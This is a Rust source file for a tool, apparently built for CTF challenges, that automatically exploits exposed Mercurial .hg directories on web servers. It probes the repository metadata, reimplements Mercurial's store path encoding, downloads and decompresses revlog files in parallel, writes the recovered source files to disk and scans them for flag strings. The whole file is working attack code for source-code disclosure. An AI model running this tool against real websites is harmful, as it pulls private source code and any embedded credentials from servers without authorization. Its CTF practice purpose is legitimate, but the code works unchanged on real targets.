//! dumpvcs hg: .hg(Mercurial) 泄露自动利用
//! 纯 Rust: fncache + store 路径编码 + revlog v1 解压(zlib/zstd/raw)

use crate::{fetch, host_slug, parallel_map, write_out, CommonArgs};
use common::http::HttpClient;
use common::{exit, Out};
use serde::Serialize;
use sha1::{Digest, Sha1};
use std::path::Path;

#[derive(Serialize, Clone)]
pub struct ProbeInfo {
    path: String,
    status: u16,
    size: usize,
}

#[derive(Serialize, Clone)]
pub struct RestoredFile {
    store: String,
    file: String,
    size: usize,
}

#[derive(Serialize)]
pub struct HgReport {
    pub vcs: &'static str,
    pub target: String,
    pub out: String,
    pub probe: Vec<ProbeInfo>,
    pub fncache: Vec<String>,
    pub restored: Vec<RestoredFile>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub cat: Option<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub flags: Vec<String>,
}

fn be32(b: &[u8]) -> u32 {
    u32::from_be_bytes([b[0], b[1], b[2], b[3]])
}

fn be64(b: &[u8]) -> u64 {
    u64::from_be_bytes([b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]])
}

fn hex(data: &[u8]) -> String {
    data.iter().map(|b| format!("{b:02x}")).collect()
}

fn zlib_decompress(data: &[u8]) -> Option<Vec<u8>> {
    use flate2::read::ZlibDecoder;
    use std::io::Read;
    let mut dec = ZlibDecoder::new(data);
    let mut out = Vec::new();
    dec.read_to_end(&mut out).ok()?;
    Some(out)
}

fn decompress_chunk(chunk: &[u8]) -> Option<Vec<u8>> {
    if chunk.is_empty() {
        return Some(Vec::new());
    }
    match chunk[0] {
        0x78 => zlib_decompress(chunk),
        0x28 => zstd::stream::decode_all(chunk).ok(),
        0x75 => Some(chunk[1..].to_vec()),
        0x00 => Some(chunk.to_vec()),
        _ => zlib_decompress(chunk).or_else(|| Some(chunk.to_vec())),
    }
}

struct RevEntry {
    base: i64,
    zlen: usize,
    chunk_pos: usize,
    index: usize,
}

fn parse_revlog_index(data: &[u8]) -> Option<(bool, Vec<RevEntry>)> {
    if data.len() < 64 {
        return None;
    }
    let header = be32(&data[..4]);
    if header & 0xFFFF != 1 {
        return None;
    }
    let inline = header & (1 << 16) != 0;
    let mut revs = Vec::new();
    let mut pos = 0usize;
    let mut i = 0usize;
    while pos + 64 <= data.len() {
        let e = &data[pos..pos + 64];
        let raw = be64(&e[..8]);
        let offset = if i == 0 { 0usize } else { (raw >> 16) as usize };
        let zlen = be32(&e[8..12]) as usize;
        let base = be32(&e[16..20]) as i64;
        let chunk_pos = if inline { pos + 64 } else { offset };
        revs.push(RevEntry {
            base,
            zlen,
            chunk_pos,
            index: i,
        });
        pos = if inline {
            match pos.checked_add(64 + zlen) {
                Some(p) => p,
                None => break,
            }
        } else {
            pos + 64
        };
        i += 1;
    }
    Some((inline, revs))
}

fn revlog_content(revs: &[RevEntry], data: &[u8]) -> Option<Vec<u8>> {
    for rev in revs.iter().rev() {
        if rev.base != rev.index as i64 {
            continue;
        }
        let end = rev.chunk_pos.checked_add(rev.zlen)?;
        if end > data.len() {
            continue;
        }
        if let Some(text) = decompress_chunk(&data[rev.chunk_pos..end]) {
            return Some(text);
        }
    }
    None
}

fn encodedir(s: &str) -> String {
    s.replace(".hg/", ".hg.hg/")
        .replace(".i/", ".i.hg/")
        .replace(".d/", ".d.hg/")
}

fn decodedir(s: &str) -> String {
    s.replace(".hg.hg/", ".hg/")
        .replace(".i.hg/", ".i/")
        .replace(".d.hg/", ".d/")
}

fn is_reserved(b: u8) -> bool {
    !(32..=125).contains(&b) || matches!(b, b'\\' | b':' | b'*' | b'?' | b'"' | b'<' | b'>' | b'|')
}

fn encode_bytes(s: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(s.len());
    for &b in s {
        match b {
            b'A'..=b'Z' => {
                out.push(b'_');
                out.push(b | 0x20);
            }
            b'_' => out.extend_from_slice(b"__"),
            _ if is_reserved(b) => out.extend_from_slice(format!("~{b:02x}").as_bytes()),
            _ => out.push(b),
        }
    }
    out
}

fn lowerencode(s: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(s.len());
    for &b in s {
        match b {
            b'A'..=b'Z' => out.push(b | 0x20),
            _ if is_reserved(b) => out.extend_from_slice(format!("~{b:02x}").as_bytes()),
            _ => out.push(b),
        }
    }
    out
}

fn auxencode(comp: &[u8], dotencode: bool) -> Vec<u8> {
    let mut n = comp.to_vec();
    if n.is_empty() {
        return n;
    }
    if dotencode && (n[0] == b'.' || n[0] == b' ') {
        let mut v = format!("~{:02x}", n[0]).into_bytes();
        v.extend_from_slice(&n[1..]);
        n = v;
    } else {
        let dot = n.iter().position(|&b| b == b'.').unwrap_or(n.len());
        let head = &n[..dot];
        let res3 = head == b"aux" || head == b"con" || head == b"prn" || head == b"nul";
        let res4 = head.len() == 4
            && (&head[..3] == b"com" || &head[..3] == b"lpt")
            && head[3].is_ascii_digit()
            && head[3] != b'0';
        if res3 || res4 {
            let mut v = n[..2].to_vec();
            v.extend_from_slice(format!("~{:02x}", n[2]).as_bytes());
            v.extend_from_slice(&n[3..]);
            n = v;
        }
    }
    if let Some(&last) = n.last() {
        if last == b'.' || last == b' ' {
            let esc = format!("~{last:02x}");
            n.truncate(n.len() - 1);
            n.extend_from_slice(esc.as_bytes());
        }
    }
    n
}

fn hashencode(path: &[u8], dotencode: bool) -> String {
    let digest = hex(&Sha1::digest(path));
    let le = lowerencode(&path[5..]);
    let parts: Vec<Vec<u8>> = le.split(|&b| b == b'/').map(|c| auxencode(c, dotencode)).collect();
    let basename = parts.last().cloned().unwrap_or_default();
    let ext: Vec<u8> = match basename.iter().rposition(|&b| b == b'.') {
        Some(i) if i > 0 => basename[i..].to_vec(),
        _ => Vec::new(),
    };
    let mut sdirs: Vec<Vec<u8>> = Vec::new();
    let mut sdirslen = 0usize;
    for p in &parts[..parts.len().saturating_sub(1)] {
        let mut d = p[..p.len().min(8)].to_vec();
        if let Some(&last) = d.last() {
            if last == b'.' || last == b' ' {
                d.pop();
                d.push(b'_');
            }
        }
        let t = if sdirslen == 0 {
            d.len()
        } else {
            sdirslen + 1 + d.len()
        };
        if sdirslen != 0 && t > 68 {
            break;
        }
        sdirs.push(d);
        sdirslen = t;
    }
    let mut dirs = Vec::new();
    for (i, d) in sdirs.iter().enumerate() {
        if i > 0 {
            dirs.push(b'/');
        }
        dirs.extend_from_slice(d);
    }
    if !dirs.is_empty() {
        dirs.push(b'/');
    }
    let mut res = b"dh/".to_vec();
    res.extend_from_slice(&dirs);
    res.extend_from_slice(digest.as_bytes());
    res.extend_from_slice(&ext);
    if res.len() < 120 {
        let spaceleft = 120 - res.len();
        let mut res2 = b"dh/".to_vec();
        res2.extend_from_slice(&dirs);
        res2.extend_from_slice(&basename[..basename.len().min(spaceleft)]);
        res2.extend_from_slice(digest.as_bytes());
        res2.extend_from_slice(&ext);
        res = res2;
    }
    String::from_utf8_lossy(&res).to_string()
}

#[derive(Clone, Copy, PartialEq)]
enum Encode {
    Plain,
    Hybrid,
    Dotencode,
}

fn encode_path(logical: &str, mode: Encode) -> String {
    let de = encodedir(logical);
    match mode {
        Encode::Plain => String::from_utf8_lossy(&encode_bytes(de.as_bytes())).to_string(),
        Encode::Hybrid | Encode::Dotencode => {
            let dotencode = mode == Encode::Dotencode;
            let parts: Vec<Vec<u8>> = de
                .as_bytes()
                .split(|&b| b == b'/')
                .map(|c| auxencode(&encode_bytes(c), dotencode))
                .collect();
            let mut res = Vec::new();
            for (i, p) in parts.iter().enumerate() {
                if i > 0 {
                    res.push(b'/');
                }
                res.extend_from_slice(p);
            }
            if res.len() > 120 {
                hashencode(de.as_bytes(), dotencode)
            } else {
                String::from_utf8_lossy(&res).to_string()
            }
        }
    }
}

fn decode_store_name(name: &str) -> String {
    let mut s = name;
    if let Some(rest) = s.strip_prefix("data/") {
        s = rest;
    }
    for ext in [".i", ".d", ".df"] {
        if let Some(rest) = s.strip_suffix(ext) {
            s = rest;
            break;
        }
    }
    if let Some(rest) = s.strip_prefix('_') {
        format!(".{rest}")
    } else {
        s.to_string()
    }
}

struct StoreFetch {
    logical: String,
    actual: String,
    index: Option<Vec<u8>>,
    data: Option<Vec<u8>>,
}

fn candidates(logical: &str, mode: Encode) -> Vec<String> {
    let enc = encode_path(logical, mode);
    if enc == logical {
        vec![logical.to_string()]
    } else {
        vec![enc, logical.to_string()]
    }
}

fn fetch_store(client: &HttpClient, base: &str, logical: &str, mode: Encode) -> StoreFetch {
    let mut actual = logical.to_string();
    let mut index = None;
    for cand in candidates(logical, mode) {
        if let Some(d) = fetch(client, &format!("{base}store/{cand}")) {
            actual = cand;
            index = Some(d);
            break;
        }
    }
    let mut data = None;
    if let Some(idx) = &index {
        if let Some((inline, _)) = parse_revlog_index(idx) {
            if !inline {
                let dotd = format!("{}d", &actual[..actual.len() - 1]);
                data = fetch(client, &format!("{base}store/{dotd}"));
            }
        }
    }
    StoreFetch {
        logical: logical.to_string(),
        actual,
        index,
        data,
    }
}

pub fn run(args: &CommonArgs, client: &HttpClient, out: &Out) -> (HgReport, u8) {
    let mut url = args.url.trim_end_matches('/').to_string();
    if !url.ends_with(".hg") {
        url.push_str("/.hg");
    }
    url.push('/');

    let out_dir = args
        .out
        .clone()
        .unwrap_or_else(|| format!("hgdump_{}", host_slug(&url)));

    out.info(&format!("[*] 目标: {url}"));

    let seed = [
        "/requires",
        "/dirstate",
        "/store/fncache",
        "/store/00changelog.i",
        "/store/00manifest.i",
    ];
    let mut probe = Vec::new();
    let mut fncache_text: Option<String> = None;
    for path in seed {
        let data = fetch(client, &format!("{url}{}", path.trim_start_matches('/')));
        let status = if data.is_some() { 200 } else { 404 };
        let size = data.as_ref().map(|d| d.len()).unwrap_or(0);
        out.info(&format!("    [{status}] {path} ({size} B)"));
        if path == "/store/fncache" {
            if let Some(d) = &data {
                fncache_text = Some(String::from_utf8_lossy(d).to_string());
            }
        }
        probe.push(ProbeInfo {
            path: path.to_string(),
            status,
            size,
        });
    }

    let mut store_reqs = String::new();
    for p in ["/store/requires", "/requires"] {
        if let Some(d) = fetch(client, &format!("{url}{}", p.trim_start_matches('/'))) {
            store_reqs.push_str(&String::from_utf8_lossy(&d));
            store_reqs.push('\n');
        }
    }
    let reqs: Vec<&str> = store_reqs.split_whitespace().collect();
    let mode = if reqs.contains(&"dotencode") {
        Encode::Dotencode
    } else if reqs.contains(&"exp-very-fragile-and-unsafe-plain-store-encoding") {
        Encode::Plain
    } else {
        Encode::Hybrid
    };

    let Some(fncache) = fncache_text else {
        out.info("[!] fncache 未获取（404/网络错误），无法枚举文件");
        let report = HgReport {
            vcs: "hg",
            target: url,
            out: out_dir,
            probe,
            fncache: Vec::new(),
            restored: Vec::new(),
            cat: None,
            flags: Vec::new(),
        };
        return (report, exit::NO_RESULT);
    };

    let store_files: Vec<String> = fncache
        .lines()
        .map(|l| decodedir(l.trim()))
        .filter(|l| !l.is_empty())
        .collect();
    out.info(&format!("[*] fncache 文件数: {}", store_files.len()));
    for f in &store_files {
        out.info(&format!("    {f}"));
    }

    if args.list {
        let report = HgReport {
            vcs: "hg",
            target: url,
            out: out_dir,
            probe,
            fncache: store_files,
            restored: Vec::new(),
            cat: None,
            flags: Vec::new(),
        };
        let code = if report.fncache.is_empty() {
            exit::NO_RESULT
        } else {
            exit::OK
        };
        return (report, code);
    }

    if let Err(e) = std::fs::create_dir_all(&out_dir) {
        out.error(&format!("创建输出目录失败: {e}"));
    }

    let targets: Vec<String> = store_files
        .iter()
        .filter(|f| f.starts_with("data/") && f.ends_with(".i"))
        .cloned()
        .collect();
    let fetched = parallel_map(&targets, args.jobs, |sp| {
        fetch_store(client, &url, sp, mode)
    });

    let mut restored: Vec<RestoredFile> = Vec::new();
    let mut contents: Vec<(String, Option<Vec<u8>>)> = Vec::new();
    for f in fetched {
        let Some(index) = &f.index else {
            out.info(&format!("    [404] {}", f.logical));
            continue;
        };
        let (inline, revs) = match parse_revlog_index(index) {
            Some(v) => v,
            None => {
                out.info(&format!("    [!] {} revlog 解析失败", f.actual));
                continue;
            }
        };
        let data: &[u8] = if inline {
            index
        } else {
            f.data.as_deref().unwrap_or(&[])
        };
        let content = revlog_content(&revs, data);
        let fname = decode_store_name(&f.logical);
        let size = content.as_ref().map(|c| c.len()).unwrap_or(0);
        let _ = write_out(
            Path::new(&out_dir),
            &fname,
            content.as_deref().unwrap_or(&[]),
        );
        out.info(&format!("    [+] {} → {fname} ({size} B)", f.actual));
        restored.push(RestoredFile {
            store: f.actual.clone(),
            file: fname.clone(),
            size,
        });
        contents.push((fname, content));
    }

    out.info(&format!("\n[+] 还原文件: {} 个 → {out_dir}/", restored.len()));

    let cat = args.cat.as_ref().and_then(|want| {
        contents
            .iter()
            .find(|(n, _)| n == want)
            .map(|(n, c)| (n.clone(), c.clone().unwrap_or_default()))
    });
    if let Some(want) = &args.cat {
        match &cat {
            Some((_, c)) if !c.is_empty() => {
                out.info(&format!("\n--- {want} ---"));
                out.info(String::from_utf8_lossy(c).trim());
            }
            Some(_) => out.info(&format!("[!] {want} 无内容")),
            None => out.info(&format!("[!] 未找到 {want}")),
        }
    }

    let mut flags: Vec<String> = Vec::new();
    if args.cat.is_none() {
        out.info("\n[+] 扫描结果:");
        let mut flag_found = false;
        for (fname, content) in &contents {
            let Some(content) = content else {
                continue;
            };
            if content.is_empty() {
                continue;
            }
            let s = String::from_utf8_lossy(content);
            let lines: Vec<&str> = s
                .lines()
                .filter(|l| l.to_lowercase().contains("flag") || l.contains("ctfhub{"))
                .collect();
            if !lines.is_empty() {
                out.info(&format!("    {fname}:"));
                for l in lines {
                    out.info(&format!("        {l}"));
                }
                flag_found = true;
            }
            flags.extend(common::scan_flags(content));
        }
        if !flag_found {
            out.info("    (未自动发现 flag，请手动检查还原文件)");
        }
    }
    flags.sort();
    flags.dedup();

    let report = HgReport {
        vcs: "hg",
        target: url,
        out: out_dir,
        probe,
        fncache: store_files,
        restored: restored.clone(),
        cat: cat.map(|(_, c)| String::from_utf8_lossy(&c).trim().to_string()),
        flags,
    };

    let code = if restored.is_empty() || (args.cat.is_some() && report.cat.is_none()) {
        exit::NO_RESULT
    } else {
        exit::OK
    };
    (report, code)
}
